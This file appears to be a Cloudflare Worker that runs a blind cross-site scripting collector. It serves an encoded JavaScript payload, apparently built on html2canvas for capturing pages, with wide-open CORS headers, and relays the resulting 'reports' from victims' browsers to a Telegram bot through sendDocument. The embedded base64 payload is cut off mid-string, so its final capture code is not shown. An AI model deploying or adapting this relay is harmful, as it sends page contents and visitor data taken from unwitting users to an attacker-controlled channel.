addEventListener('fetch', event => {
  event.respondWith(forwardReport(event.request))
})

const BotToken = "XXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
const ChatID = "XXXXXXXXX"

async function forwardReport(req) {
  if(req.method === 'GET' || req.method === 'OPTIONS'){
    let ip = req.headers.get("cf-connecting-ip")
    console.log("Origin: "+ip)
    let worker = new URL(req.url).hostname
    let p = atob(PAYLOAD).replace(/\[CHATID\]/g,ChatID)
    p = p.replace(/\[MOTHERSHIP\]/g,worker)
    p = p.replace(/\[ORIGIN\]/g,ip)
    let resp = new Response(p, {status: 200})
    resp.headers.set('Content-Type', 'application/x-javascript')
    resp.headers.set('Access-Control-Allow-Credentials', 'true')
    resp.headers.set('Access-Control-Allow-Headers', 'X-Requested-With, Content-Type, Origin, Authorization, Accept, Accept-Encoding')
    resp.headers.set('Access-Control-Allow-Methods', 'OPTIONS, PUT, DELETE, POST, GET')
    resp.headers.set('Access-Control-Allow-Origin','*')
    resp.headers.set('Pragma','no-cache')
    let path = new URL(req.url).hostname
    console.log(path)
    return resp
  }

  let path = new URL(req.url).pathname
  if(!path.includes(ChatID)) {
    return new Response('',{status: 501})
  }

  console.log("Valid Report !")
  const init = {
    body: req.body,
    headers: req.headers,
    method: req.method
  }
  console.log("Method: "+req.method)
  let address = 'https://api.telegram.org/bot'+ BotToken + '/sendDocument'
  let response = await fetch (address, init);

  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText
  })
}

const PAYLOAD = "CgovLyBodHRwczovL2dpdGh1Yi5jb20vbmlrbGFzdmgvaHRtbDJjYW52YXMKIWZ1bmN0aW9uKHQsZSxuKXtmdW5jdGlvbiByKHQsZSxuLHIpe3JldHVybiBjKHQsbixyLGUpLnRoZW4oZnVuY3Rpb24oYSl7RSgiRG9jdW1lbnQgY2xvbmVkIik7dmFyIGM9IlsiK0VlKyI9J3RydWUnXSI7dC5xdWVyeVNlbGVjdG9yKGMpLnJlbW92ZUF0dHJpYnV0ZShFZSk7dmFyIGg9YS5jb250ZW50V2luZG93LHU9aC5kb2N1bWVudC5xdWVyeVNlbGVjdG9yKGMpLHA9bmV3IGRlKGguZG9jdW1lbnQpLGw9bmV3IG0oZSxwKSxkPUIodSksZj0idmlldyI9PT1lLnR5cGU/TWF0aC5taW4oZC53aWR0aCxuKTpvKCksZz0idmlldyI9PT1lLnR5cGU/TWF0aC5taW4oZC5oZWlnaHQscik6cygpLHk9bmV3IHhlKGYsZyxsLGUpLHY9bmV3IFAodSx5LHAsbCxlKTtyZXR1cm4gdi5yZWFkeS50aGVuKGZ1bmN0aW9uKCl7RSgiRmluaXNoZWQgcmVuZGVyaW5nIik7dmFyIHQ9InZpZXciPT09ZS50eXBlfHx1IT09aC5kb2N1bWVudC5ib2R5JiZ1IT09aC5kb2N1bWVudC5kb2N1bWVudEVsZW1lbnQ/aSh5LmNhbnZhcyxkKTp5LmNhbnZhcztyZXR1cm4gZS5yZW1vdmVDb250YWluZXImJihhLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoYSksRSgiQ2xlYW5lZCB1cCBjb250YWluZXIiKSksdH0pfSl9ZnVuY3Rpb24gaSh0LG4pe3ZhciByPWUuY3JlYXRlRWxlbWVudCgiY2FudmFzIiksaT1NYXRoLm1pbih0LndpZHRoLTEsTWF0aC5tYXgoMCxuLmxlZnQpKSxvPU1hdGgubWluKHQud2lkdGgsTWF0aC5tYXgoMSxuLmxlZnQrbi53aWR0aCkpLHM9TWF0aC5taW4odC5oZWlnaHQtMSxNYXRoLm1heCgwLG4udG9wKSksYT1NYXRoLm1pbih0LmhlaWdodCxNYXRoLm1heCgxLG4udG9wK24uaGVpZ2h0KSksYz1yLndpZHRoPW8taSxoPXIuaGVpZ2h0PWEtcztyZXR1cm4gRSgiQ3JvcHBpbmcgY2FudmFzIGF0OiIsImxlZnQ6IixuLmxlZnQsInRvcDoiLG4udG9wLCJ3aWR0aDoiLG4ud2lkdGgsImhlaWdodDoiLG4uaGVpZ2h0KSxFKCJSZXN1bHRpbmcgY3JvcCB3aXRoIHdpZHRoIixjLCJhbmQgaGVpZ2h0IixoLCIgd2l0aCB4IixpLCJhbmQgeSIscyksci5nZXRDb250ZXh0KCIyZCIpLmRyYXdJbWFnZSh0LGkscyxjLGgsMCwwLGMsaCkscn1mdW5jdGlvbiBvKCl7cmV0dXJuIE1hdGgubWF4KE1hdGgubWF4KGUuYm9keS5zY3JvbGxXaWR0aCxlLmRvY3VtZW50RWxlbWVudC5zY3JvbGxXaWR0aCksTWF0aC5tYXgoZS5ib2R5Lm9mZnNldFdpZHRoLGUuZG9jdW1lbnRFbGVtZW50Lm9mZnNldFdpZHRoKSxNYXRoLm1heChlLmJvZHkuY2xpZW50V2lkdGgsZS5kb2N1bWVudEVsZW1lbnQuY2xpZW50V2lkdGgpKX1mdW5jdGlvbiBzKCl7cmV0dXJuIE1hdGgubWF4KE1hdGgubWF4KGUuYm9keS5zY3JvbGxIZWlnaHQsZS5kb2N1bWVudEVsZW1lbnQuc2Nyb2xsSGVpZ2h0KSxNYXRoLm1heChlLmJvZHkub2Zmc2V0SGVpZ2h0LGUuZG9jdW1lbnRFbGVtZW50Lm9mZnNldEhlaWdodCksTWF0aC5tYXgoZS5ib2R5LmNsaWVudEhlaWdodCxlLmRvY3VtZW50RWxlbWVudC5jbGllbnRIZWlnaHQpKX1mdW5jdGlvbiBhKCl7cmV0dXJuImRhdGE6aW1hZ2UvZ2lmO2Jhc2U2NCxSMGxHT0RsaEFRQUJBSUFBQUFBQUFQLy8veUg1QkFFQUFBQUFMQUFBQUFBQkFBRUFBQUlCUkFBNyJ9ZnVuY3Rpb24gYyhlLG4scixpKXt2YXIgbz1lLmRvY3VtZW50RWxlbWVudC5jbG9uZU5vZGUoITApLHM9ZS5jcmVhdGVFbGVtZW50KCJpZnJhbWUiKTtyZXR1cm4gcy5zdHlsZS52aXNpYmlsaXR5PSJoaWRkZW4iLHMuc3R5bGUucG9zaXRpb249ImFic29sdXRlIixzLnN0eWxlLmxlZnQ9cy5zdHlsZS50b3A9Ii0xMDAwMHB4IixzLndpZHRoPW4scy5oZWlnaHQ9cixzLnNjcm9sbGluZz0ibm8iLGUuYm9keS5hcHBlbmRDaGlsZChzKSxuZXcgUHJvbWlzZShmdW5jdGlvbihlKXt2YXIgbj1zLmNvbnRlbnRXaW5kb3cuZG9jdW1lbnQ7cy5jb250ZW50V2luZG93Lm9ubG9hZD1zLm9ubG9hZD1mdW5jdGlvbigpe2Uocyl9LG4ub3BlbigpLG4ud3JpdGUoIjwhRE9DVFlQRSBodG1sPiIpLG4uY2xvc2UoKSxuLnJlcGxhY2VDaGlsZChoKG4uYWRvcHROb2RlKG8pKSxuLmRvY3VtZW50RWxlbWVudCksInZpZXciPT09aS50eXBlJiZzLmNvbnRlbnRXaW5kb3cuc2Nyb2xsVG8odC5wYWdlWE9mZnNldCx0LnBhZ2VZT2Zmc2V0KX0pfWZ1bmN0aW9uIGgodCl7cmV0dXJuW10uc2xpY2UuY2FsbCh0LmNoaWxkTm9kZXMsMCkuZmlsdGVyKHUpLmZvckVhY2goZnVuY3Rpb24oZSl7IlNDUklQVCI9PT1lLnRhZ05hbWU/dC5yZW1vdmVDaGlsZChlKTpoKGUpfSksdH1mdW5jdGlvbiB1KHQpe3JldHVybiB0Lm5vZGVUeXBlPT09Tm9kZS5FTEVNRU5UX05PREV9ZnVuY3Rpb24gcCh0KXtpZih0aGlzLnNyYz10LEUoIkR1bW15SW1hZ2VDb250YWluZXIgZm9yIix0KSwhdGhpcy5wcm9taXNlfHwhdGhpcy5pbWFnZSl7RSgiSW5pdGlhdGluZyBEdW1teUltYWdlQ29udGFpbmVyIikscC5wcm90b3R5cGUuaW1hZ2U9bmV3IEltYWdlO3ZhciBlPXRoaXMuaW1hZ2U7cC5wcm90b3R5cGUucHJvbWlzZT1uZXcgUHJvbWlzZShmdW5jdGlvbih0LG4pe2Uub25sb2FkPXQsZS5vbmVycm9yPW4sZS5zcmM9YSgpLGUuY29tcGxldGU9PT0hMCYmdChlKX0pfX1mdW5jdGlvbiBsKHQsbil7dmFyIHIsaSxvPWUuY3JlYXRlRWxlbWVudCgiZGl2Iikscz1lLmNyZWF0ZUVsZW1lbnQoImltZyIpLGM9ZS5jcmVhdGVFbGVtZW50KCJzcGFuIiksaD0iSGlkZGVuIFRleHQiO28uc3R5bGUudmlzaWJpbGl0eT0iaGlkZGVuIixvLnN0eWxlLmZvbnRGYW1pbHk9dCxvLnN0eWxlLmZvbnRTaXplPW4sby5zdHlsZS5tYXJnaW49MCxvLnN0eWxlLnBhZGRpbmc9MCxlLmJvZHkuYXBwZW5kQ2hpbGQobykscy5zcmM9YSgpLHMud2lkdGg9MSxzLmhlaWdodD0xLHMuc3R5bGUubWFyZ2luPTAscy5zdHlsZS5wYWRkaW5nPTAscy5zdHlsZS52ZXJ0aWNhbEFsaWduPSJiYXNlbGluZSIsYy5zdHlsZS5mb250RmFtaWx5PXQsYy5zdHlsZS5mb250U2l6ZT1uLGMuc3R5bGUubWFyZ2luPTAsYy5zdHlsZS5wYWRkaW5nPTAsYy5hcHBlbmRDaGlsZChlLmNyZWF0ZVRleHROb2RlKGgpKSxvLmFwcGVuZENoaWxkKGMpLG8uYXBwZW5kQ2hpbGQocykscj1zLm9mZnNldFRvcC1jLm9mZnNldFRvcCsxLG8ucmVtb3ZlQ2hpbGQoYyksby5hcHBlbmRDaGlsZChlLmNyZWF0ZVRleHROb2RlKGgpKSxvLnN0eWxlLmxpbmVIZWlnaHQ9Im5vcm1hbCIscy5zdHlsZS52ZXJ0aWNhbEFsaWduPSJzdXBlciIsaT1zLm9mZnNldFRvcC1vLm9mZnNldFRvcCsxLGUuYm9keS5yZW1vdmVDaGlsZChvKSx0aGlzLmJhc2VsaW5lPXIsdGhpcy5saW5lV2lkdGg9MSx0aGlzLm1pZGRsZT1pfWZ1bmN0aW9uIGQoKXt0aGlzLmRhdGE9e319ZnVuY3Rpb24gZih0KXt0aGlzLnNyYz10LnZhbHVlLHRoaXMuY29sb3JTdG9wcz1bXSx0aGlzLnR5cGU9bnVsbCx0aGlzLngwPS41LHRoaXMueTA9LjUsdGhpcy54MT0uNSx0aGlzLnkxPS41LHRoaXMucHJvbWlzZT1Qcm9taXNlLnJlc29sdmUoITApfWZ1bmN0aW9uIGcodCxlKXt0aGlzLnNyYz10LHRoaXMuaW1hZ2U9bmV3IEltYWdlO3ZhciBuPXRoaXM7dGhpcy50YWludGVkPW51bGwsdGhpcy5wcm9taXNlPW5ldyBQcm9taXNlKGZ1bmN0aW9uKHIsaSl7bi5pbWFnZS5vbmxvYWQ9cixuLmltYWdlLm9uZXJyb3I9aSxlJiYobi5pbWFnZS5jcm9zc09yaWdpbj0iYW5vbnltb3VzIiksbi5pbWFnZS5zcmM9dCxuLmltYWdlLmNvbXBsZXRlPT09ITAmJnIobi5pbWFnZSl9KVsiY2F0Y2giXShmdW5jdGlvbigpe3ZhciBlPW5ldyBwKHQpO3JldHVybiBlLnByb21pc2UudGhlbihmdW5jdGlvbih0KXtuLmltYWdlPXR9KX0pfWZ1bmN0aW9uIG0oZSxuKXt0aGlzLmxpbms9bnVsbCx0aGlzLm9wdGlvbnM9ZSx0aGlzLnN1cHBvcnQ9bix0aGlzLm9yaWdpbj10LmxvY2F0aW9uLnByb3RvY29sK3QubG9jYXRpb24uaG9zdG5hbWUrdC5sb2NhdGlvbi5wb3J0fWZ1bmN0aW9uIHkodCl7cmV0dXJuIklNRyI9PT10Lm5vZGUubm9kZU5hbWV9ZnVuY3Rpb24gdih0KXtyZXR1cm4ic3ZnIj09PXQubm9kZS5ub2RlTmFtZX1mdW5jdGlvbiB3KHQpe3JldHVybnthcmdzOlt0Lm5vZGUuc3JjXSxtZXRob2Q6InVybCJ9fWZ1bmN0aW9uIGIodCl7cmV0dXJue2FyZ3M6W3Qubm9kZV0sbWV0aG9kOiJzdmcifX1mdW5jdGlvbiB4KHQpe2YuYXBwbHkodGhpcyxhcmd1bWVudHMpLHRoaXMudHlwZT10aGlzLlRZUEVTLkxJTkVBUjt2YXIgZT1udWxsPT09dC5hcmdzWzBdLm1hdGNoKHRoaXMuc3RlcFJlZ0V4cCk7ZT90LmFyZ3NbMF0uc3BsaXQoIiAiKS5yZXZlcnNlKCkuZm9yRWFjaChmdW5jdGlvbih0KXtzd2l0Y2godCl7Y2FzZSJsZWZ0Ijp0aGlzLngwPTAsdGhpcy54MT0xO2JyZWFrO2Nhc2UidG9wIjp0aGlzLnkwPTAsdGhpcy55MT0xO2JyZWFrO2Nhc2UicmlnaHQiOnRoaXMueDA9MSx0aGlzLngxPTA7YnJlYWs7Y2FzZSJib3R0b20iOnRoaXMueTA9MSx0aGlzLnkxPTA7YnJlYWs7Y2FzZSJ0byI6dmFyIGU9dGhpcy55MCxuPXRoaXMueDA7dGhpcy55MD10aGlzLnkxLHRoaXMueDA9dGhpcy54MSx0aGlzLngxPW4sdGhpcy55MT1lO2JyZWFrO2RlZmF1bHQ6dmFyIHI9dC5tYXRjaCh0aGlzLmFuZ2xlUmVnRXhwKTtpZihyKXN3aXRjaChyWzJdKXtjYXNlImRlZyI6dmFyIGk9cGFyc2VGbG9hdChyWzFdKSxvPWkvKDE4MC9NYXRoLlBJKSxzPU1hdGgudGFuKG8pO3RoaXMueTA9Mi9NYXRoLnRhbihzKS8yLHRoaXMueDA9MCx0aGlzLngxPTEsdGhpcy55MT0wfX19LHRoaXMpOih0aGlzLnkwPTAsdGhpcy55MT0xKSx0aGlzLmNvbG9yU3RvcHM9dC5hcmdzLnNsaWNlKGU/MTowKS5tYXAoZnVuY3Rpb24odCl7dmFyIGU9dC5tYXRjaCh0aGlzLnN0ZXBSZWdFeHApO3JldHVybntjb2xvcjplWzFdLHN0b3A6IiUiPT09ZVszXT9lWzJdLzEwMDpudWxsfX0sdGhpcyksbnVsbD09PXRoaXMuY29sb3JTdG9wc1swXS5zdG9wJiYodGhpcy5jb2xvclN0b3BzWzBdLnN0b3A9MCksbnVsbD09PXRoaXMuY29sb3JTdG9wc1t0aGlzLmNvbG9yU3RvcHMubGVuZ3RoLTFdLnN0b3AmJih0aGlzLmNvbG9yU3RvcHNbdGhpcy5jb2xvclN0b3BzLmxlbmd0aC0xXS5zdG9wPTEpLHRoaXMuY29sb3JTdG9wcy5mb3JFYWNoKGZ1bmN0aW9uKHQsZSl7bnVsbD09PXQuc3RvcCYmdGhpcy5jb2xvclN0b3BzLnNsaWNlKGUpLnNvbWUoZnVuY3Rpb24obixyKXtyZXR1cm4gbnVsbCE9PW4uc3RvcD8odC5zdG9wPShuLnN0b3AtdGhpcy5jb2xvclN0b3BzW2UtMV0uc3RvcCkvKHIrMSkrdGhpcy5jb2xvclN0b3BzW2UtMV0uc3RvcCwhMCk6ITF9LHRoaXMpfSx0aGlzKX1mdW5jdGlvbiBFKCl7dC5odG1sMmNhbnZhcy5sb2dnaW5nJiZ0LmNvbnNvbGUmJnQuY29uc29sZS5sb2cmJkZ1bmN0aW9uLnByb3RvdHlwZS5iaW5kLmNhbGwodC5jb25zb2xlLmxvZyx0LmNvbnNvbGUpLmFwcGx5KHQuY29uc29sZSxbRGF0ZS5ub3coKS10Lmh0bWwyY2FudmFzLnN0YXJ0KyJtcyIsImh0bWwyY2FudmFzOiJdLmNvbmNhdChbXS5zbGljZS5jYWxsKGFyZ3VtZW50cywwKSkpfWZ1bmN0aW9uIFQodCxlKXt0aGlzLm5vZGU9dCx0aGlzLnBhcmVudD1lLHRoaXMuc3RhY2s9bnVsbCx0aGlzLmJvdW5kcz1udWxsLHRoaXMub2Zmc2V0Qm91bmRzPW51bGwsdGhpcy52aXNpYmxlPW51bGwsdGhpcy5jb21wdXRlZFN0eWxlcz1udWxsLHRoaXMuc3R5bGVzPXt9LHRoaXMuYmFja2dyb3VuZEltYWdlcz1udWxsLHRoaXMudHJhbnNmb3JtRGF0YT1udWxsLHRoaXMudHJhbnNmb3JtTWF0cml4PW51bGx9ZnVuY3Rpb24gQyh0KXt2YXIgZT10Lm9wdGlvbnNbdC5zZWxlY3RlZEluZGV4fHwwXTtyZXR1cm4gZT9lLnRleHR8fCIiOiIifWZ1bmN0aW9uIGsodCl7cmV0dXJuIHQmJiJtYXRyaXgiPT09dFsxXT90WzJdLnNwbGl0KCIsIikubWFwKGZ1bmN0aW9uKHQpe3JldHVybiBwYXJzZUZsb2F0KHQudHJpbSgpKX0pOnZvaWQgMH1mdW5jdGlvbiBJKHQpe3JldHVybi0xIT09dC50b1N0cmluZygpLmluZGV4T2YoIiUiKX1mdW5jdGlvbiBTKHQpe3ZhciBlLG4scixpLG8scyxhLGM9IiBcclxuICAiLGg9W10sdT0wLHA9MCxsPWZ1bmN0aW9uKCl7ZSYmKCciJz09PW4uc3Vic3RyKDAsMSkmJihuPW4uc3Vic3RyKDEsbi5sZW5ndGgtMikpLG4mJmEucHVzaChuKSwiLSI9PT1lLnN1YnN0cigwLDEpJiYoaT1lLmluZGV4T2YoIi0iLDEpKzEpPjAmJihyPWUuc3Vic3RyKDAsaSksZT1lLnN1YnN0cihpKSksaC5wdXNoKHtwcmVmaXg6cixtZXRob2Q6ZS50b0xvd2VyQ2FzZSgpLHZhbHVlOm8sYXJnczphLGltYWdlOm51bGx9KSksYT1bXSxlPXI9bj1vPSIifTtyZXR1cm4gYT1bXSxlPXI9bj1vPSIiLHQuc3BsaXQoIiIpLmZvckVhY2goZnVuY3Rpb24odCl7aWYoISgwPT09dSYmYy5pbmRleE9mKHQpPi0xKSl7c3dpdGNoKHQpe2Nhc2UnIic6cz9zPT09dCYmKHM9bnVsbCk6cz10O2JyZWFrO2Nhc2UiKCI6aWYocylicmVhaztpZigwPT09dSlyZXR1cm4gdT0xLHZvaWQobys9dCk7cCsrO2JyZWFrO2Nhc2UiKSI6aWYocylicmVhaztpZigxPT09dSl7aWYoMD09PXApcmV0dXJuIHU9MCxvKz10LHZvaWQgbCgpO3AtLX1icmVhaztjYXNlIiwiOmlmKHMpYnJlYWs7aWYoMD09PXUpcmV0dXJuIHZvaWQgbCgpO2lmKDE9PT11JiYwPT09cCYmIWUubWF0Y2goL151cmwkL2kpKXJldHVybiBhLnB1c2gobiksbj0iIix2b2lkKG8rPXQpfW8rPXQsMD09PXU/ZSs9dDpuKz10fX0pLGwoKSxofWZ1bmN0aW9uIFIodCl7cmV0dXJuIHQucmVwbGFjZSgicHgiLCIiKX1mdW5jdGlvbiBPKHQpe3JldHVybiBwYXJzZUZsb2F0KHQpfWZ1bmN0aW9uIEIodCl7aWYodC5nZXRCb3VuZGluZ0NsaWVudFJlY3Qpe3ZhciBlPXQuZ2V0Qm91bmRpbmdDbGllbnRSZWN0KCksbj0iQk9EWSI9PT10Lm5vZGVOYW1lLHI9bj90LnNjcm9sbFdpZHRoOm51bGw9PXQub2Zmc2V0V2lkdGg/ZS53aWR0aDp0Lm9mZnNldFdpZHRoO3JldHVybnt0b3A6ZS50b3AsYm90dG9tOmUuYm90dG9tfHxlLnRvcCtlLmhlaWdodCxyaWdodDplLmxlZnQrcixsZWZ0OmUubGVmdCx3aWR0aDpyLGhlaWdodDpuP3Quc2Nyb2xsSGVpZ2h0Om51bGw9PXQub2Zmc2V0SGVpZ2h0P2UuaGVpZ2h0OnQub2Zmc2V0SGVpZ2h0fX1yZXR1cm57fX1mdW5jdGlvbiBNKHQpe3ZhciBlPXQub2Zmc2V0UGFyZW50P00odC5vZmZzZXRQYXJlbnQpOnt0b3A6MCxsZWZ0OjB9O3JldHVybnt0b3A6dC5vZmZzZXRUb3ArZS50b3AsYm90dG9tOnQub2Zmc2V0VG9wK3Qub2Zmc2V0SGVpZ2h0K2UudG9wLHJpZ2h0OnQub2Zmc2V0TGVmdCtlLmxlZnQrdC5vZmZzZXRXaWR0aCxsZWZ0OnQub2Zmc2V0TGVmdCtlLmxlZnQsd2lkdGg6dC5vZmZzZXRXaWR0aCxoZWlnaHQ6dC5vZmZzZXRIZWlnaHR9fWZ1bmN0aW9uIFAodCxlLG4scixpKXtFKCJTdGFydGluZyBOb2RlUGFyc2VyIiksdGhpcy5yZW5kZXJlcj1lLHRoaXMub3B0aW9ucz1pLHRoaXMucmFuZ2U9bnVsbCx0aGlzLnN1cHBvcnQ9bix0aGlzLnJlbmRlclF1ZXVlPVtdLHRoaXMuc3RhY2s9bmV3IGxlKCEwLDEsdC5vd25lckRvY3VtZW50LG51bGwpO3ZhciBvPW5ldyBUKHQsbnVsbCk7dCE9PXQub3duZXJEb2N1bWVudC5kb2N1bWVudEVsZW1lbnQmJnRoaXMucmVuZGVyZXIuaXNUcmFuc3BhcmVudChvLmNzcygiYmFja2dyb3VuZENvbG9yIikpJiZlLnJlY3RhbmdsZSgwLDAsZS53aWR0aCxlLmhlaWdodCxuZXcgVCh0Lm93bmVyRG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LG51bGwpLmNzcygiYmFja2dyb3VuZENvbG9yIikpLG8udmlzaWJpbGU9by5pc0VsZW1lbnRWaXNpYmxlKCksdGhpcy5jcmVhdGVQc2V1ZG9IaWRlU3R5bGVzKHQub3duZXJEb2N1bWVudCksdGhpcy5ub2Rlcz1jZShbb10uY29uY2F0KHRoaXMuZ2V0Q2hpbGRyZW4obykpLmZpbHRlcihmdW5jdGlvbih0KXtyZXR1cm4gdC52aXNpYmxlPXQuaXNFbGVtZW50VmlzaWJsZSgpfSkubWFwKHRoaXMuZ2V0UHNldWRvRWxlbWVudHMsdGhpcykpLHRoaXMuZm9udE1ldHJpY3M9bmV3IGQsRSgiRmV0Y2hlZCBub2RlcyIpLHRoaXMuaW1hZ2VzPXIuZmV0Y2godGhpcy5ub2Rlcy5maWx0ZXIodGUpKSxFKCJDcmVhdGluZyBzdGFja2luZyBjb250ZXh0cyIpLHRoaXMuY3JlYXRlU3RhY2tpbmdDb250ZXh0cygpLEUoIlNvcnRpbmcgc3RhY2tpbmcgY29udGV4dHMiKSx0aGlzLnNvcnRTdGFja2luZ0NvbnRleHRzKHRoaXMuc3RhY2spLHRoaXMucmVhZHk9dGhpcy5pbWFnZXMucmVhZHkudGhlbihpZShmdW5jdGlvbigpe3JldHVybiBFKCJJbWFnZXMgbG9hZGVkLCBzdGFydGluZyBwYXJzaW5nIiksdGhpcy5wYXJzZSh0aGlzLnN0YWNrKSxFKCJSZW5kZXIgcXVldWUgY3JlYXRlZCB3aXRoICIrdGhpcy5yZW5kZXJRdWV1ZS5sZW5ndGgrIiBpdGVtcyIpLG5ldyBQcm9taXNlKGllKGZ1bmN0aW9uKHQpe2kuYXN5bmM/ImZ1bmN0aW9uIj09dHlwZW9mIGkuYXN5bmM/aS5hc3luYy5jYWxsKHRoaXMsdGhpcy5yZW5kZXJRdWV1ZSx0KToodGhpcy5yZW5kZXJJbmRleD0wLHRoaXMuYXN5bmNSZW5kZXJlcih0aGlzLnJlbmRlclF1ZXVlLHQpKToodGhpcy5yZW5kZXJRdWV1ZS5mb3JFYWNoKHRoaXMucGFpbnQsdGhpcyksdCgpKX0sdGhpcykpfSx0aGlzKSl9ZnVuY3Rpb24gQSh0KXtyZXR1cm4gdC5yZXBsYWNlKC8oXC1bYS16XSkvZyxmdW5jdGlvbih0KXtyZXR1cm4gdC50b1VwcGVyQ2FzZSgpLnJlcGxhY2UoIi0iLCIiKX0pfWZ1bmN0aW9uIE4oKXt9ZnVuY3Rpb24gTCh0LGUsbixyKXt2YXIgaT00KigoTWF0aC5zcXJ0KDIpLTEpLzMpLG89bippLHM9cippLGE9dCtuLGM9ZStyO3JldHVybnt0b3BMZWZ0Ol8oe3g6dCx5OmN9LHt4OnQseTpjLXN9LHt4OmEtbyx5OmV9LHt4OmEseTplfSksdG9wUmlnaHQ6Xyh7eDp0LHk6ZX0se3g6dCtvLHk6ZX0se3g6YSx5OmMtc30se3g6YSx5OmN9KSxib3R0b21SaWdodDpfKHt4OmEseTplfSx7eDphLHk6ZStzfSx7eDp0K28seTpjfSx7eDp0LHk6Y30pLGJvdHRvbUxlZnQ6Xyh7eDphLHk6Y30se3g6YS1vLHk6Y30se3g6dCx5OmUrc30se3g6dCx5OmV9KX19ZnVuY3Rpb24gRCh0LGUsbil7dmFyIHI9dC5sZWZ0LGk9dC50b3Asbz10LndpZHRoLHM9dC5oZWlnaHQsYT1lWzBdWzBdLGM9ZVswXVsxXSxoPWVbMV1bMF0sdT1lWzFdWzFdLHA9ZVsyXVswXSxsPWVbMl1bMV0sZD1lWzNdWzBdLGY9ZVszXVsxXSxnPW8taCxtPXMtbCx5PW8tcCx2PXMtZjtyZXR1cm57dG9wTGVmdE91dGVyOkwocixpLGEsYykudG9wTGVmdC5zdWJkaXZpZGUoLjUpLHRvcExlZnRJbm5lcjpMKHIrblszXS53aWR0aCxpK25bMF0ud2lkdGgsTWF0aC5tYXgoMCxhLW5bM10ud2lkdGgpLE1hdGgubWF4KDAsYy1uWzBdLndpZHRoKSkudG9wTGVmdC5zdWJkaXZpZGUoLjUpLHRvcFJpZ2h0T3V0ZXI6TChyK2csaSxoLHUpLnRvcFJpZ2h0LnN1YmRpdmlkZSguNSksdG9wUmlnaHRJbm5lcjpMKHIrTWF0aC5taW4oZyxvK25bM10ud2lkdGgpLGkrblswXS53aWR0aCxnPm8rblszXS53aWR0aD8wOmgtblszXS53aWR0aCx1LW5bMF0ud2lkdGgpLnRvcFJpZ2h0LnN1YmRpdmlkZSguNSksYm90dG9tUmlnaHRPdXRlcjpMKHIreSxpK20scCxsKS5ib3R0b21SaWdodC5zdWJkaXZpZGUoLjUpLGJvdHRvbVJpZ2h0SW5uZXI6TChyK01hdGgubWluKHksbytuWzNdLndpZHRoKSxpK01hdGgubWluKG0scytuWzBdLndpZHRoKSxNYXRoLm1heCgwLHAtblsxXS53aWR0aCksTWF0aC5tYXgoMCxsLW5bMl0ud2lkdGgpKS5ib3R0b21SaWdodC5zdWJkaXZpZGUoLjUpLGJvdHRvbUxlZnRPdXRlcjpMKHIsaSt2LGQsZikuYm90dG9tTGVmdC5zdWJkaXZpZGUoLjUpLGJvdHRvbUxlZnRJbm5lcjpMKHIrblszXS53aWR0aCxpK3YsTWF0aC5tYXgoMCxkLW5bM10ud2lkdGgpLE1hdGgubWF4KDAsZi1uWzJdLndpZHRoKSkuYm90dG9tTGVmdC5zdWJkaXZpZGUoLjUpfX1mdW5jdGlvbiBfKHQsZSxuLHIpe3ZhciBpPWZ1bmN0aW9uKHQsZSxuKXtyZXR1cm57eDp0LngrKGUueC10LngpKm4seTp0LnkrKGUueS10LnkpKm59fTtyZXR1cm57c3RhcnQ6dCxzdGFydENvbnRyb2w6ZSxlbmRDb250cm9sOm4sZW5kOnIsc3ViZGl2aWRlOmZ1bmN0aW9uKG8pe3ZhciBzPWkodCxlLG8pLGE9aShlLG4sbyksYz1pKG4scixvKSxoPWkocyxhLG8pLHU9aShhLGMsbykscD1pKGgsdSxvKTtyZXR1cm5bXyh0LHMsaCxwKSxfKHAsdSxjLHIpXX0sY3VydmVUbzpmdW5jdGlvbih0KXt0LnB1c2goWyJiZXppZXJDdXJ2ZSIsZS54LGUueSxuLngsbi55LHIueCxyLnldKX0sY3VydmVUb1JldmVyc2VkOmZ1bmN0aW9uKHIpe3IucHVzaChbImJlemllckN1cnZlIixuLngsbi55LGUueCxlLnksdC54LHQueV0pfX19ZnVuY3Rpb24gRih0LGUsbixyLGksbyxzKXt2YXIgYT1bXTtyZXR1cm4gZVswXT4wfHxlWzFdPjA/KGEucHVzaChbImxpbmUiLHJbMV0uc3RhcnQueCxyWzFdLnN0YXJ0LnldKSxyWzFdLmN1cnZlVG8oYSkpOmEucHVzaChbImxpbmUiLHQuYzFbMF0sdC5jMVsxXV0pLG5bMF0+MHx8blsxXT4wPyhhLnB1c2goWyJsaW5lIixvWzBdLnN0YXJ0Lngsb1swXS5zdGFydC55XSksb1swXS5jdXJ2ZVRvKGEpLGEucHVzaChbImxpbmUiLHNbMF0uZW5kLngsc1swXS5lbmQueV0pLHNbMF0uY3VydmVUb1JldmVyc2VkKGEpKTooYS5wdXNoKFsibGluZSIsdC5jMlswXSx0LmMyWzFdXSksYS5wdXNoKFsibGluZSIsdC5jM1swXSx0LmMzWzFdXSkpLGVbMF0+MHx8ZVsxXT4wPyhhLnB1c2goWyJsaW5lIixpWzFdLmVuZC54LGlbMV0uZW5kLnldKSxpWzFdLmN1cnZlVG9SZXZlcnNlZChhKSk6YS5wdXNoKFsibGluZSIsdC5jNFswXSx0LmM0WzFdXSksYX1mdW5jdGlvbiBXKHQsZSxuLHIsaSxvLHMpe2VbMF0+MHx8ZVsxXT4wPyh0LnB1c2goWyJsaW5lIixyWzBdLnN0YXJ0LngsclswXS5zdGFydC55XSksclswXS5jdXJ2ZVRvKHQpLHJbMV0uY3VydmVUbyh0KSk6dC5wdXNoKFsibGluZSIsbyxzXSksKG5bMF0+MHx8blsxXT4wKSYmdC5wdXNoKFsibGluZSIsaVswXS5zdGFydC54LGlbMF0uc3RhcnQueV0pfWZ1bmN0aW9uIEgodCl7cmV0dXJuIHQuY3NzSW50KCJ6SW5kZXgiKTwwfWZ1bmN0aW9uIGoodCl7cmV0dXJuIHQuY3NzSW50KCJ6SW5kZXgiKT4wfWZ1bmN0aW9uIFYodCl7cmV0dXJuIDA9PT10LmNzc0ludCgiekluZGV4Iil9ZnVuY3Rpb24geih0KXtyZXR1cm4tMSE9PVsiaW5saW5lIiwiaW5saW5lLWJsb2NrIiwiaW5saW5lLXRhYmxlIl0uaW5kZXhPZih0LmNzcygiZGlzcGxheSIpKX1mdW5jdGlvbiBZKHQpe3JldHVybiB0IGluc3RhbmNlb2YgbGV9ZnVuY3Rpb24gWCh0KXtyZXR1cm4gdC